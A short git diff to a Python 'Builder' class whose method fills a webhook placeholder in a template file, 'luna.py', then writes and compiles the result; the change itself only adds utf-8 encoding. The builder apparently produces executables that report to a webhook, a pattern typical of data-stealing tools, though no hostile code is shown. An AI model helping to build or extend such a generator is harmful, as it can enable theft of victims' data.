@@ -129,10 +129,10 @@ class Builder:
     def mk_file(self, filename, webhook):
         print(f'{Fore.MAGENTA}[+]{Fore.RESET} Generating source code...')
         
-        with open('./luna.py', 'r') as f:
+        with open('./luna.py', 'r', encoding="utf-8") as f:
             code = f.read()
-            
-        with open(f"{filename}.py", 'w') as f:
+
+        with open(f"{filename}.py", "w", encoding="utf-8") as f:
             f.write(code.replace('&webhook_here&', webhook))
         
         self.compile(filename)
